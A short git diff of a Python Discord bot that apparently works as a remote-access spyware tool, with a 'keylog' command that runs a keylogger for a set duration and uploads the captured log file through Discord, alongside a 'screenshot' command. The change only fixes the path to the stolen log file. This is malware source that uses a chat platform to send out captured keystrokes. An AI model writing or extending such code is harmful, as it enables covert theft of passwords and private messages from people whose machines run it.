@@ -1,4 +1,3 @@
-from ast import Try
 import discord
 import os
 import asyncio
@@ -93,12 +92,13 @@ async def screenshot(interaction: discord.Interaction):
 async def keylog(interaction: discord.Interaction, duration: int=60):
     print(interaction, duration)
     await interaction.response.defer()
+    curDir = os.getcwd()
     klog = keylogger.keylogger(duration)
     logfile = klog.logname
     klog.start()
     if klog.finished == True:
         try:
-            await interaction.followup.send(file=discord.File(logfile))
+            await interaction.followup.send(file=discord.File("{0}\\logs\\{1}".format(curDir,logfile)))
         except Exception:
             await interaction.followup.send(file=discord.File(".\\Python\\logs\\{}".format(logfile)))
     
